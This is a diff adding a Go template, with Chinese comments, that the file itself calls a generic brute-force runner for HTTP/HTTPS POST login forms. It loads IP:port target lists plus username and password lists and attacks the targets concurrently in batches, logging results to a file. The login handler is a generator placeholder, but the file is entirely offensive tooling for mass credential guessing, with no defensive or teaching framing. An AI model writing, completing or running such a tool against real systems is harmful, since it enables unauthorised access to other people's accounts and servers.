@@ -1,0 +1,77 @@
+// 通用爆破 runner —— 适用于模式 1-5, 8 (HTTP/HTTPS POST 登录)
+// 由 Python 生成器填充 {{.XXX}} 占位符
+
+package main
+
+import (
+	"context"
+	"fmt"
+	"os"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+)
+
+var wg sync.WaitGroup
+var semaphore = make(chan struct{}, {{.SemaphoreSize}})
+var completedCount int64
+var totalTasks int64
+var startTime time.Time
+
+{{.HandlerCode}}
+
+func main() {
+	inputFile := "{{.InputFile}}"
+	lines, err := os.ReadFile(inputFile)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "无法读取输入文件: %v\n", err)
+		return
+	}
+
+	usernames := {{.UserList}}
+	passwords := {{.PassList}}
+
+	outputFile := "{{.OutputFile}}"
+	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "无法打开输出文件: %v\n", err)
+		return
+	}
+	defer file.Close()
+
+	batchSize := {{.BatchSize}}
+	var batch []string
+
+	allLines := strings.Split(string(lines), "\n")
+	for _, line := range allLines {
+		line = strings.TrimSpace(line)
+		if line != "" {
+			batch = append(batch, line)
+		}
+	}
+
+	totalTasks = int64(len(batch))
+	startTime = time.Now()
+	go updateProgress()
+
+	for i := 0; i < len(batch); i += batchSize {
+		end := i + batchSize
+		if end > len(batch) {
+			end = len(batch)
+		}
+		currentBatch := batch[i:end]
+
+		for _, ipPort := range currentBatch {
+			wg.Add(1)
+			go processIP(ipPort, file, usernames, passwords)
+		}
+
+		wg.Wait()
+		time.Sleep(100 * time.Millisecond)
+		triggerGC()
+	}
+
+	time.Sleep(1 * time.Second)
+	fmt.Println("\n全部处理完成！")
+}
